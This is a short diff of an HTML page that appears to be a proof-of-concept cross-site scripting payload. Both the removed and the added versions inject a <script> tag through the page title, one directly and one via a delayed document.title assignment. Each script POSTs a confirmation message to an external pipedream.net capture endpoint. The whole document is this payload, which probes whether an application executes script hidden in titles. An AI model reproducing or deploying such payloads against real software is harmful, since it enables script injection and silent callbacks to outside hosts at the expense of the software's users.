@@ -1,13 +1,17 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title><script>
-    console.log('Payload executed');
-    fetch('https://eownbmaqeyx6p8e.m.pipedream.net', {
-      method: 'POST',
-      body: 'Payload executed'
-    });
-    </script></title>
+    <title>Initial Title</title>
+    <script>
+        setTimeout(() => {
+            document.title = `<script>
+            fetch('https://eownbmaqeyx6p8e.m.pipedream.net', {
+              method: 'POST',
+              body: 'Payload executed!!!!!'
+            });
+            </script>`;
+        }, 1000);
+    </script>
 </head>
 <body>
 </body>
